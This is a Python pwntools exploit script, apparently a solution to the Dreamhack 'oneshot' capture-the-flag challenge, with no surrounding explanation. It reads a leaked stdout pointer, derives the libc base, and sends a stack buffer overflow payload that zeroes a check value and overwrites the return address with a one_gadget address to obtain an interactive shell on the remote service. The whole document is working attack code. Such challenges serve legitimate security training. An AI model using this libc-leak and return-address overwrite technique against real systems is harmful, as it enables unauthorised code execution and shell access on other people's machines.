from pwn import *

r = remote("host3.dreamhack.games", 11359)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
context.log_level = 'debug'

def slog(n, m): return success(":".join([n, hex(m)]))

# get stdout pointer addr
r.recvuntil("stdout: ")
stdout = r.recvuntil("\n").strip("\n")
stdout = int(stdout, 16)
slog("stdout address", stdout)

# Leak the library base
offset = 0x3ec760 # stdout_addr_lib(0x7ffff7dce760) - lib_address(0x00007ffff79e2000)
slog("offset", offset)
slog("offset from symbols", libc.symbols["_IO_2_1_stdout_"])
base = stdout - libc.symbols["_IO_2_1_stdout_"]
slog("base", base)

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
oneshot = base + one_gadget[0] #one_gadget[0 or 1 or 2 or 3]
slog("one_shot", oneshot)

# Stack Buffer Overflow
buf = b"A"*24 #buf(16 byte) + dummy(8byte)
# buf + check(-> 0) + SFP + RET(to oneshot gadget)
payload = buf + p64(0) + b"B"*8 + p64(oneshot) 

r.send(payload)
r.interactive()
